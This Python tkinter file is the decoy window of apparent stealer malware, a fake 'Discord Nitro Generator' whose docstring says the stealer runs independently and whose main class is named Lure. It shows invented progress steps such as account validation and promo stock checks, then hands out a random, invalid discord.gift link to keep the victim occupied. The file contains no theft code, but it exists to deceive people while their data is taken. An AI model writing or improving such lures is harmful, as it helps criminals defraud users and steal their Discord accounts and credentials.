"""Discord-styled Nitro generator window. The stealer runs independently."""

import random
import string
import threading
import time
import tkinter as tk

BG = "#1e1f22"
PANEL = "#2b2d31"
FIELD = "#1e1f22"
ACCENT = "#5865f2"
ACCENT_DARK = "#4752c4"
TEXT = "#f2f3f5"
MUTED = "#b5bac1"
GREEN = "#23a55a"
RED = "#f23f43"

ALPHABET = string.ascii_uppercase + "23456789"

STEPS = (
    ("Connecting to Discord gateway...", 14),
    ("Validating account...", 36),
    ("Checking promo stock...", 61),
    ("Generating gift...", 84),
    ("Almost done...", 97),
)


class Lure(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Nitro Generator")
        self.configure(bg=BG)
        self.resizable(False, False)
        self.progress = 0
        self.gift = ""
        self._build()
        self._center(560, 500)

    def _build(self):
        header = tk.Frame(self, bg=BG)
        header.pack(fill="x", padx=26, pady=(24, 18))
        tk.Label(
            header,
            text="N",
            bg=ACCENT,
            fg="white",
            font=("Segoe UI", 18, "bold"),
            width=2,
            height=1,
        ).pack(side="left")
        titles = tk.Frame(header, bg=BG)
        titles.pack(side="left", padx=12)
        tk.Label(
            titles,
            text="Nitro Generator",
            bg=BG,
            fg=TEXT,
            font=("Segoe UI", 17, "bold"),
            anchor="w",
        ).pack(anchor="w")
        tk.Label(
            titles,
            text="Free 1 month of Discord Nitro",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 9),
            anchor="w",
        ).pack(anchor="w")

        panel = tk.Frame(self, bg=PANEL)
        panel.pack(fill="both", expand=True, padx=26, pady=(0, 18))
        body = tk.Frame(panel, bg=PANEL)
        body.pack(fill="both", expand=True, padx=20, pady=18)

        tk.Label(
            body,
            text="Discord username",
            bg=PANEL,
            fg=MUTED,
            font=("Segoe UI", 9),
            anchor="w",
        ).pack(fill="x")
        self.username = tk.Entry(
            body,
            bg=FIELD,
            fg=TEXT,
            insertbackground=TEXT,
            relief="flat",
            font=("Segoe UI", 11),
            bd=0,
        )
        self.username.pack(fill="x", ipady=8, pady=(6, 14))

        self.button = tk.Button(
            body,
            text="Generate Nitro",
            command=self._generate,
            bg=ACCENT,
            fg="white",
            activebackground=ACCENT_DARK,
            activeforeground="white",
            relief="flat",
            bd=0,
            cursor="hand2",
            font=("Segoe UI", 10, "bold"),
            height=2,
        )
        self.button.pack(fill="x")
        self.button.bind("<Enter>", lambda _: self.button.config(bg=ACCENT_DARK))
        self.button.bind("<Leave>", lambda _: self.button.config(bg=ACCENT))

        self.bar = tk.Canvas(body, height=8, bg=FIELD, highlightthickness=0)
        self.bar.pack(fill="x", pady=(16, 10))
        self.fill = self.bar.create_rectangle(0, 0, 0, 8, fill=ACCENT, width=0)
        self.bar.bind("<Configure>", lambda _: self._paint())

        self.status = tk.Label(
            body,
            text="Enter your username to begin.",
            bg=PANEL,
            fg=MUTED,
            font=("Segoe UI", 9),
            anchor="w",
            justify="left",
            wraplength=450,
        )
        self.status.pack(fill="x", pady=(2, 0))

        self.result = tk.Frame(body, bg=PANEL)
        row = tk.Frame(self.result, bg=PANEL)
        row.pack(fill="x", pady=(16, 0))
        self.gift_entry = tk.Entry(
            row,
            bg=FIELD,
            fg=TEXT,
            insertbackground=TEXT,
            relief="flat",
            font=("Consolas", 10),
            bd=0,
            readonlybackground=FIELD,
        )
        self.gift_entry.pack(side="left", fill="x", expand=True, ipady=7)
        self.gift_entry.config(state="readonly")
        tk.Button(
            row,
            text="Copy",
            command=self._copy,
            bg=PANEL,
            fg=TEXT,
            activebackground=ACCENT,
            activeforeground="white",
            relief="flat",
            bd=0,
            cursor="hand2",
            font=("Segoe UI", 9),
        ).pack(side="left", padx=(8, 0))

        tk.Label(
            self,
            text="Gift stock refreshes every 24 hours. One per account.",
            bg=BG,
            fg=MUTED,
            font=("Segoe UI", 8),
        ).pack(pady=(0, 14))

    def _center(self, width, height):
        self.update_idletasks()
        x = (self.winfo_screenwidth() - width) // 2
        y = (self.winfo_screenheight() - height) // 2
        self.geometry("%dx%d+%d+%d" % (width, height, x, y))

    def _paint(self):
        width = self.bar.winfo_width()
        self.bar.coords(self.fill, 0, 0, width * self.progress / 100.0, 8)

    def _stage(self, text, percent):
        self.status.config(text=text, fg=MUTED)
        self.progress = percent
        self._paint()

    def _generate(self):
        if not self.username.get().strip():
            self.status.config(text="Enter your Discord username first.", fg=RED)
            return
        self.result.pack_forget()
        self.button.config(state="disabled", text="Generating...")
        self.progress = 0
        self._paint()
        self.status.config(text="Starting...", fg=MUTED)
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        for text, percent in STEPS:
            time.sleep(random.uniform(0.9, 1.6))
            self.after(0, self._stage, text, percent)
        code = "".join(random.choice(ALPHABET) for _ in range(16))
        self.after(0, self._done, code)

    def _done(self, code):
        self.gift = "https://discord.gift/" + code
        self.gift_entry.config(state="normal")
        self.gift_entry.delete(0, "end")
        self.gift_entry.insert(0, self.gift)
        self.gift_entry.config(state="readonly")
        self.result.pack(fill="x")
        self.progress = 100
        self._paint()
        self.status.config(
            text="Gift ready. Claim it in Discord within 24 hours.", fg=GREEN
        )
        self.button.config(state="normal", text="Generate another")

    def _copy(self):
        if not self.gift:
            return
        self.clipboard_clear()
        self.clipboard_append(self.gift)
        self.status.config(text="Copied to clipboard.", fg=GREEN)


def show():
    Lure().mainloop()
